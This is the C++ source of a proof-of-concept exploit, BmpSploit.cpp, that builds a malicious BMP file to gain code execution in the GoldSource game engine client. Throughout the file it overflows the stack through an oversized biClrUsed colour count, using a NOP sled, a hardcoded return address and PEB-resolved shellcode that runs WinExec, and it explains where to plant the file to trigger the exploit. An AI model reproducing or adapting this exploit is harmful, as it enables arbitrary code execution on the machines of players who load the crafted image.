/*****************************************************************
*
* BmpSploit.cpp
*
* LoadBMP8 client-side exploit for GoldSource Engine.
*
* Allows to execute any binary code on game client via .bmp files.
*
* Author: Alexander Belkin, also known as 2010kohtep.
*
* THIS PROJECT IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
* THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
* CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
*
*****************************************************************/

#include <Windows.h>
#include <iostream>  // fopen, fwrite

#include "Common/Types.h"
#include "Utils/File.h"
#include "Utils/InlineCode.h"

const int gQuadCount = 700;

void shellcode()
{
	//
	// Go to the bottom of the stack to get ability to
	// allocate arguments in shellcode function.
	//

	__asm
	{
		sub esp, 0x8000;
	}

	//
	// Allocating string on the stack. We can't use global
	// memory, because we are going to use this code as shellcode,
	// what means that all global pointers will be invalid.
	//
	// Stack is the local function memory, so we can write our strings
	// here freely.
	//

	const wchar_t szKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
	const wchar_t szWinExec[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0' };

	auto pfnWinExec = (TWinExec)GetProcAddressPeb(szKernel32, szWinExec);
	
	const char szProcName[] = { 'c', 'a', 'l', 'c', '\0' };

	//
	// Open calculator via WinAPI function - WinExec.
	//
	// We can also use CreateProcess[A/W], but WinExec
	// is much easier and simple.
	//

	pfnWinExec(szProcName, SW_NORMAL);
} int shellcodeEnd() { return 0x01010102; }

void WriteExploitableChunk(FILE *stream)
{
	//
	// Now we need to write some trash data to perform
	// the stack corruption. We have a little trick here:
	// if FS_Read function reaches end of file, then
	// exploitable function will finish it's work and will try
	// to return control to caller. So we need to write less data
	// than set in 'biClrUsed' variable, that's why we are doing
	// " - sizeof(RGBQUAD)" code.
	//
	// But we have a little problem here at the same time:
	// we have only ~3380 bytes on the stack on Windows 10
	// system, so we need to use stack space frugally, because
	// if we will use too much space, then exploitable data
	// from the file will not be copied to the stack, and
	// FS_Read will return -1.
	//

	char data[gQuadCount * sizeof(RGBQUAD) - sizeof(RGBQUAD)] = { 0 };
	{
		memset(data, 0x90, sizeof(data));
	}

	*(short *)&data[1082] = 0x04EB; // jmp $+4
	*(int *)&data[1084] = 0x19F724; // Windows 10 stack return address
	
	auto nCodeSize = (int)shellcodeEnd - (int)shellcode;
	memcpy(&data[1088], shellcode, nCodeSize);

	fwrite(&data, stream);
}

int main()
{
	FILE *f;
	fopen_s(&f, "de_dust2.bmp", "wb");

	//
	// Build main BMP header.
	//

	BITMAPFILEHEADER fileHdr = { 0 };
	{
		//
		// Exploitable function checks only two of these parameters,
		// so we can ignore the others.
		//

		fileHdr.bfReserved1 = 0;
		fileHdr.bfReserved2 = 0;
	}

	//
	// Build color map header.
	//

	BITMAPINFOHEADER infoHdr = { 0 };
	{
		//
		// Exploitable function requires these variables to be
		// like this, otherwise function will skip file processing.
		//

		infoHdr.biSize = 40;
		infoHdr.biPlanes = 1;
		infoHdr.biBitCount = 8;
		infoHdr.biCompression = 0;

		//
		// 'biClrUsed' is our star attraction. Function expects this
		// variable to be less or equal to 256, otherwise FS_Read is
		// going to corrupt stack memory.
		//

		infoHdr.biClrUsed = gQuadCount;
	}

	//
	// Write main BMP header. 
	//

	fwrite(&fileHdr, f);

	//
	// Write color map header. 
	//

	fwrite(&infoHdr, f);

	//
	// Write exploitable chunk.
	//

	WriteExploitableChunk(f);

	//
	// Close BMP file.
	//

	fclose(f);

	//
	// Exploitable image is successfully created.
	//
	// Now we need to put this file in 'gamedir\overviews'
	// folder and replace existing file (if file name 
	// is de_dust2.bmp). After that you need to start 
	// 'de_dust2' map and exploit will started. That's
	// an easy way to test the exploit.
	//

	return 0;
}